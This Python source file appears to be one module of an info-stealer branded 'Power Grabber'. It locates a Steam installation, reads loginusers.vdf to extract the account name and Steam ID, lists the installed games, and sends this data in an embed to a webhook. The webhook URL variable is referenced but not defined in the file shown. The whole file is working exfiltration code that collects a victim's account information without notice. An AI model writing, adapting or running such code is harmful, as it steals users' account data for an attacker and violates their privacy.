import os
import re
import requests
import datetime
STEAM_DEFAULT_PATHS = [
    "C:\\Program Files (x86)\\Steam",
    "C:\\Program Files\\Steam",
    os.path.expanduser("~\\AppData\\Local\\Steam")
]
SYSTEM_GAME_NAMES = {
    "Steamworks Common Redistributables",
    "SteamVR",
    "Steam Client",
    "Source SDK",
    "Steam Runtime"
}
def is_steam_installed():
    for path in STEAM_DEFAULT_PATHS:
        steam_exe_path = os.path.join(path, "steam.exe")
        if os.path.exists(steam_exe_path):
            return path
    return None
def get_account_name_and_steam_id_from_vdf(vdf_path):
    try:
        with open(vdf_path, "r", encoding="utf-8") as file:
            data = file.read()
            account_name_match = re.search(r'"AccountName"\s+"(.*?)"', data)
            steam_id_match = re.search(r'"(\d{17})"', data)  # Steam IDs are 17 digits long
            account_name = account_name_match.group(1) if account_name_match else None
            steam_id = steam_id_match.group(1) if steam_id_match else None
            return account_name, steam_id
    except FileNotFoundError:
        pass
    except PermissionError:
        pass
    return None, None
def get_library_folders(steam_install_path):
    libraryfolders_path = os.path.join(steam_install_path, "steamapps", "libraryfolders.vdf")
    library_folders = [steam_install_path]
    if os.path.exists(libraryfolders_path):
        with open(libraryfolders_path, "r", encoding="utf-8") as file:
            data = file.read()
            additional_folders = re.findall(r'"path"\s+"(.*?)"', data)
            library_folders.extend(additional_folders)
    return library_folders
def parse_acf_file(file_path):
    with open(file_path, "r", encoding="utf-8") as file:
        for line in file:
            if '"name"' in line:
                return line.split('"')[3]
    return None
def get_installed_steam_games(steam_install_path):
    installed_games = []
    library_folders = get_library_folders(steam_install_path)
    for library in library_folders:
        steamapps_path = os.path.join(library, "steamapps")
        if os.path.exists(steamapps_path):
            for item in os.listdir(steamapps_path):
                if item.endswith(".acf"):
                    acf_path = os.path.join(steamapps_path, item)
                    game_name = parse_acf_file(acf_path)
                    if game_name and game_name not in SYSTEM_GAME_NAMES:
                        installed_games.append(game_name)
    return installed_games
def send_webhook(account_name, games, steam_id):
    games_url = f"https://steamcommunity.com/id/{steam_id}/games"
    wishlist_url = f"https://steamcommunity.com/id/{steam_id}/wishlist"
    timestamp = datetime.datetime.utcnow().isoformat() + "Z"
    embed = {
        "embeds": [
            {
                "title": f"🎮 Steam Account Info for **{account_name}**",
                "description": (
                    "Here’s the **Steam Account Information**, a list of **installed games**, and the **games URL** for this user."
                ),
                "color": 0x8b0000,
                "thumbnail": {
                    "url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
                },
                "fields": [
                    {
                        "name": "👤 **Steam Account Name**",
                        "value": f"**{account_name}**",
                        "inline": True
                    },
                    {
                        "name": "🎮 **Number of Games**",
                        "value": f"{len(games)} games installed",
                        "inline": True
                    },
                    {
                        "name": "🕹️ **Installed Games**",
                        "value": "\n".join(games) if games else "No games installed.",
                        "inline": False
                    },
                    {
                        "name": "💿 **User's Game Library:**",
                        "value": f"[Click Me]({games_url})",
                        "inline": False
                    },
                    {
                        "name": "🌠 **User's Wishlist:**",
                        "value": f"[Click Me]({wishlist_url})",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Power Grabber | Created by Powercascade & Taktikal.exe",
                    "icon_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
                },
                "timestamp": timestamp
            }
        ]
    }
    try:
        response = requests.post(webhook_url, json=embed)
        if response.status_code == 204:
            pass
        else:
            print(f"Failed to send webhook. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Webhook request failed: {e}")
def main():
    steam_install_path = is_steam_installed()
    if steam_install_path:
        config_path = os.path.join(steam_install_path, "config")
        vdf_path = os.path.join(config_path, "loginusers.vdf")
        account_name, steam_id = get_account_name_and_steam_id_from_vdf(vdf_path)
        if account_name and steam_id:
            games = get_installed_steam_games(steam_install_path)
            send_webhook(account_name, games, steam_id)
        else:
            print("Failed to retrieve account name or Steam ID.")
    else:
        print("Steam is not installed.")

if __name__ == "__main__":
    main()
